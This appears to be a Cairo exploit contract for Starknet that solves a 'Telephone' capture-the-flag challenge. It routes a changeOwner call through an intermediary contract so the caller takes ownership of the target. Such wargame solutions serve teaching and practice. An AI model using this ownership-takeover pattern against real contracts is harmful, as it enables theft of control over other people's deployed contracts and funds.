use starknet::ContractAddress;

#[starknet::interface]
trait ITelephoneExploit<TContractState> {
    fn call_telephone(ref self: TContractState, _owner: ContractAddress);
}

#[starknet::interface]
trait ITelephone<TContractState> {
    fn isComplete(self: @TContractState) -> bool;
    fn changeOwner(ref self: TContractState, _owner: ContractAddress);
}

#[starknet::contract]
mod TelephoneExploit {
    use telephone::telephone_exploit::ITelephoneDispatcherTrait;
    use starknet::{ContractAddress, get_caller_address, get_tx_info};
    use super::ITelephoneDispatcher;

    #[storage]
    struct Storage {
        telephone: ContractAddress,
    }

    #[constructor]
    fn constructor(ref self: ContractState, telephone: ContractAddress) {
        self.telephone.write(telephone);
    }

    #[abi(embed_v0)]
    impl TelephoneExploit of super::ITelephoneExploit<ContractState> {
        fn call_telephone(ref self: ContractState, _owner: ContractAddress) {
            ITelephoneDispatcher { contract_address: self.telephone.read() }
                .changeOwner(get_caller_address());
        }
    }
}
